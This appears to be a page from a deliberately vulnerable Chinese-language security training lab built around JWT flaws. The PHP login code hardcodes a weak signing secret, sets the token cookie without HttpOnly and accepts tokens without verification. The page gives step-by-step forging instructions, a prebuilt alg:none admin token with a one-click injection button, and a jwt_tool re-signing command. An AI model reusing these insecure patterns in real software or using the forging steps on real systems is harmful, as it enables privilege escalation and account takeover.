<?php
session_start();
$error = '';
$token = '';
$secret_key = 'weak_secret_key_123';

function generateJWT($payload, $secret, $alg = 'HS256') {
    $header = json_encode(['typ' => 'JWT', 'alg' => $alg]);
    $payload_encoded = base64url_encode(json_encode($payload));
    $header_encoded = base64url_encode($header);
    
    if ($alg === 'none') {
        $signature_encoded = '';
    } else {
        $signature = hash_hmac('sha256', $header_encoded . '.' . $payload_encoded, $secret, true);
        $signature_encoded = base64url_encode($signature);
    }
    
    return $header_encoded . '.' . $payload_encoded . '.' . $signature_encoded;
}

function base64url_encode($data) {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}

// 检查是否通过Cookie或Authorization头传递了JWT
$jwt_token = '';
if (isset($_COOKIE['jwt_token'])) {
    $jwt_token = $_COOKIE['jwt_token'];
} elseif (isset($_SERVER['HTTP_AUTHORIZATION'])) {
    $auth_header = $_SERVER['HTTP_AUTHORIZATION'];
    if (strpos($auth_header, 'Bearer ') === 0) {
        $jwt_token = substr($auth_header, 7);
    }
}

// 如果已有有效token，直接跳转到dashboard
if ($jwt_token) {
    $_SESSION['token'] = $jwt_token;
    header('Location: jwt_dashboard.php');
    exit;
}

// 处理登录请求
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    
    // 普通用户列表
    $users = ['user', 'test', 'guest', 'demo'];
    
    if (in_array($username, $users)) {
        // 普通用户登录，生成普通权限token
        $payload = [
            'user' => $username,
            'role' => 'user',
            'exp' => time() + 3600,
            'iat' => time()
        ];
        $token = generateJWT($payload, $secret_key);
        
        // 设置Cookie，模拟真实JWT传输
        setcookie('jwt_token', $token, time() + 3600, '/', '', false, false); // httponly=false允许JS读取
        $_SESSION['token'] = $token;
        $_SESSION['logged_in'] = true;
        
        header('Location: jwt_dashboard.php');
        exit;
    } else {
        $error = '用户名不存在，可用测试账号：user, test, guest, demo';
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JWT弱密钥漏洞</title>
    <link rel="stylesheet" href="../assets/css/style.css">
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 850px;
            margin: 30px auto;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 35px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            margin-bottom: 25px;
        }
        .card h2 {
            color: #333;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .alert-info {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 25px;
        }
        .alert-info h4 {
            margin-bottom: 10px;
            font-size: 1.2rem;
        }
        .code-block {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            overflow-x: auto;
            margin: 15px 0;
        }
        .info-section {
            background: #e8f4fd;
            border-left: 5px solid #667eea;
            padding: 20px;
            border-radius: 0 10px 10px 0;
            margin-bottom: 25px;
        }
        .hint-section {
            background: #fff3cd;
            border-left: 5px solid #ffc107;
            padding: 20px;
            border-radius: 0 10px 10px 0;
            margin-bottom: 25px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        .form-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #667eea;
        }
        .btn {
            padding: 14px 30px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.3s;
        }
        .btn:hover {
            transform: translateY(-2px);
        }
        .btn-success {
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
        }
        .error {
            color: #e74c3c;
            text-align: center;
            margin-bottom: 20px;
            padding: 10px;
            background: #fee;
            border-radius: 8px;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #667eea;
            text-decoration: none;
            font-weight: 600;
        }
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .tab-btn {
            padding: 10px 20px;
            border: none;
            background: #e9ecef;
            border-radius: 20px;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.3s;
        }
        .tab-btn.active {
            background: #667eea;
            color: white;
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
        }
        .highlight {
            background: #ffeb3b;
            padding: 2px 5px;
            border-radius: 3px;
            color: #333;
        }
        .token-display {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            word-break: break-all;
            border: 1px solid #dee2e6;
            margin-top: 10px;
        }
        .forge-form {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
        }
        .forge-form input, .forge-form textarea {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ced4da;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }
        .forge-form textarea {
            min-height: 100px;
            resize: vertical;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="alert-info">
                <h4>🔐 JWT认证机制</h4>
                <p>本场景使用Cookie传输JWT Token，支持Authorization: Bearer头方式。登录后可在浏览器开发者工具中查看Cookie。</p>
            </div>
            
            <h2>6. 🔐 JWT弱密钥漏洞</h2>
            
            <div class="info-section">
                <strong>💡 漏洞说明：</strong><br>
                本系统使用弱密钥 <code>weak_secret_key_123</code> 进行JWT签名，且存在算法混淆漏洞（alg: none）。<br>
                JWT通过 <span class="highlight">Cookie: jwt_token=xxx</span> 或 <span class="highlight">Authorization: Bearer xxx</span> 传输。<br>
                <br>
                <strong>攻击目标：</strong>以普通用户身份登录获取JWT，然后伪造admin权限token访问管理员功能。
            </div>
            
            <div class="hint-section">
                <strong>🎯 攻击步骤：</strong><br>
                1. 使用普通账号（user/test/guest/demo）登录<br>
                2. 在浏览器开发者工具 → Application → Cookies 中查看 jwt_token<br>
                3. 解码JWT，修改role为admin<br>
                4. 使用弱密钥重新签名，或使用alg:none算法<br>
                5. 替换Cookie中的token，刷新页面<br>
                <br>
                <strong>可用测试账号：</strong> user, test, guest, demo（无需密码）
            </div>
        </div>

        <div class="card">
            <h3>🔑 登录获取JWT</h3>
            <?php if ($error): ?>
                <div class="error"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
            <form method="POST">
                <div class="form-group">
                    <label for="username">用户名（普通用户）</label>
                    <input type="text" id="username" name="username" placeholder="输入 user, test, guest 或 demo" required>
                </div>
                <button type="submit" class="btn">登录并设置JWT Cookie</button>
            </form>
        </div>

        <div class="card">
            <h3>🛠️ 在线JWT伪造工具</h3>
            <div class="tabs">
                <button class="tab-btn active" onclick="showTab('forge1')">方法1: 修改Cookie</button>
                <button class="tab-btn" onclick="showTab('forge2')">方法2: 算法混淆</button>
                <button class="tab-btn" onclick="showTab('forge3')">方法3: 密钥破解</button>
            </div>
            
            <div id="forge1" class="tab-content active">
                <p>在浏览器控制台执行以下代码修改Cookie：</p>
                <div class="code-block">// 1. 先复制当前Cookie中的jwt_token值
// 2. 解码JWT（第三部分签名可以忽略）
const token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJ1c2VyIn0.xxx';
const parts = token.split('.');

// 3. 解码payload并修改role
const payload = JSON.parse(atob(parts[1]));
payload.role = 'admin';

// 4. 重新编码（这里只是演示，实际需要签名）
const newPayload = btoa(JSON.stringify(payload)).replace(/=/g, '');
console.log('修改后的payload:', newPayload);

// 5. 使用jwt.io或jwt_tool重新签名</div>
                <button class="btn" onclick="document.cookie='jwt_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MDQwNjA4MDB9.'; location.reload();">
                    💉 一键注入alg:none admin token
                </button>
            </div>
            
            <div id="forge2" class="tab-content">
                <p>使用alg:none算法（无需签名）：</p>
                <div class="code-block">// Header: {"typ":"JWT","alg":"none"}
// Payload: {"user":"admin","role":"admin","exp":1704060800}
// Signature: 空

// 完整Token（注意最后的点）
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MDQwNjA4MDB9.</div>
                <p style="margin-top: 15px;">
                    <button class="btn btn-success" onclick="injectNoneToken()">🚀 使用alg:none登录admin</button>
                </p>
            </div>
            
            <div id="forge3" class="tab-content">
                <p>使用已知弱密钥重新签名：</p>
                <div class="code-block">// 已知密钥
const secret = 'weak_secret_key_123';

// 使用jwt_tool工具
// jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJ1c2VyIn0.xxx -S -s "weak_secret_key_123"

// 或使用在线工具 https://jwt.io
// 修改payload中的role为admin，使用密钥签名</div>
                <p style="margin-top: 15px; color: #666;">
                    💡 提示：密钥已在未授权访问漏洞中泄露
                </p>
            </div>
            
            <a href="index.php" class="back-link">← 返回身份认证首页</a>
        </div>
    </div>

    <script>
        function showTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }
        
        function injectNoneToken() {
            // alg:none token: header={"typ":"JWT","alg":"none"}, payload={"user":"admin","role":"admin","exp":9999999999}
            const noneToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9.';
            document.cookie = 'jwt_token=' + noneToken + '; path=/; max-age=3600';
            alert('已注入alg:none admin token！即将跳转到管理后台...');
            location.href = 'jwt_dashboard.php';
        }
    </script>
</body>
</html>
